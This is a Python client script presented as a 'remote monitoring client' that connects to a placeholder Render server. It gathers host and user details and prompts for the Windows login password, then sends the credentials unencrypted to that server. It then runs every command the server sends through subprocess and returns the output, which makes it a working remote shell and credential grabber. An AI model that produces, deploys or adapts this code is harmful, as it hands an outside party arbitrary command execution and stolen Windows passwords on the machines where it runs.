"""
Client Module - Enhanced for public server deployment
"""

import socket
import platform
import getpass
import subprocess
import sys
import os
import time

def get_exact_username():
    """Get exact Windows username format"""
    try:
        result = subprocess.getoutput('whoami').strip()
        return result
    except:
        return getpass.getuser()

def get_system_info():
    """Gather system information"""
    try:
        hostname = socket.gethostname()
        
        # Get all IP addresses
        ip_addresses = []
        try:
            hostname_resolved = socket.gethostbyname_ex(hostname)
            ip_addresses = hostname_resolved[2]
        except:
            ip_addresses = [socket.gethostbyname(hostname)]
        
        exact_user = get_exact_username()
        
        info = f"""
╔══════════════════════════════════════════════════════════╗
║                    SYSTEM INFORMATION                     ║
╠══════════════════════════════════════════════════════════╣
║ IP Addresses:   {', '.join(ip_addresses[:2]):<45} ║
║ Hostname:       {hostname:<45} ║
║ OS:             {platform.system()} {platform.release():<30} ║
║ Architecture:   {platform.machine():<45} ║
║ Windows User:   {exact_user:<45} ║
║ Python Version: {platform.python_version():<45} ║
╚══════════════════════════════════════════════════════════╝
"""
        return info
    except Exception as e:
        return f"Error getting system info: {e}"

def run_client():
    """Main client function"""
    # Change this to your Render server URL
    SERVER_HOST = "your-app-name.onrender.com"  # Replace with your Render app URL
    SERVER_PORT = 5000
    
    print("\n" + "="*60)
    print("  REMOTE MONITORING CLIENT")
    print("="*60)
    
    try:
        # Resolve hostname to IP
        server_ip = socket.gethostbyname(SERVER_HOST)
        print(f"\n[+] Connecting to: {SERVER_HOST} ({server_ip}:{SERVER_PORT})")
        
        # Create socket
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((server_ip, SERVER_PORT))
        
        # Get exact username
        exact_username = get_exact_username()
        display_username = exact_username.split('\\')[-1] if '\\' in exact_username else exact_username
        
        print(f"\n[+] Windows Username: {exact_username}")
        print(f"[+] Use this username: '{display_username}'")
        print(f"[+] Password: Your Windows login password\n")
        
        # Get credentials
        print("=== LOGIN ===\n")
        username = input(f"Username [{display_username}]: ").strip()
        
        if not username:
            username = display_username
            print(f"[+] Using detected username: '{username}'")
        
        password = getpass.getpass("Password: ")
        
        # Send credentials
        login_data = f"{username},{password}"
        client.send(login_data.encode())
        
        # Get response
        response = client.recv(1024).decode()
        
        if response == "AUTH_SUCCESS":
            print("\n[✓] Login successful! Connected to server.\n")
            
            # Send system info
            system_info = get_system_info()
            client.send(system_info.encode())
            
            print("[+] Connected and waiting for commands...")
            print("[+] Press Ctrl+C to disconnect\n")
            
            # Keep connection alive and listen for commands
            while True:
                try:
                    command = client.recv(1024).decode()
                    
                    if command == "HEARTBEAT":
                        client.send("ALIVE".encode())
                        continue
                    elif command == "INVALID_COMMAND":
                        print("[-] Command rejected by server")
                    elif command:
                        # Execute command
                        output = subprocess.getoutput(command)
                        client.send(output.encode())
                        
                        print("\n" + "="*60)
                        print(f"  COMMAND EXECUTED: {command}")
                        print("="*60)
                        print(output)
                        print("="*60)
                
                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"\n[!] Error: {e}")
                    break
        
        else:
            print("\n[✗] Login failed!")
            print(f"\n[!] Please try with exact username: '{display_username}'")
            print("[!] Make sure you're using your Windows login password")
    
    except socket.gaierror:
        print(f"\n[✗] Cannot resolve server: {SERVER_HOST}")
        print("[!] Make sure the server is running and the address is correct")
        input("\nPress Enter to exit...")
        sys.exit(1)
    except ConnectionRefusedError:
        print("\n[✗] Server is not running or unreachable!")
        print("[!] Please check if the server is online")
        input("\nPress Enter to exit...")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n\n[+] Disconnecting...")
    except Exception as e:
        print(f"\n[✗] Error: {e}")
        input("\nPress Enter to exit...")
        sys.exit(1)
    finally:
        try:
            client.close()
            print("\n[+] Disconnected from server")
        except:
            pass
        input("\nPress Enter to exit...")

if __name__ == "__main__":
    run_client()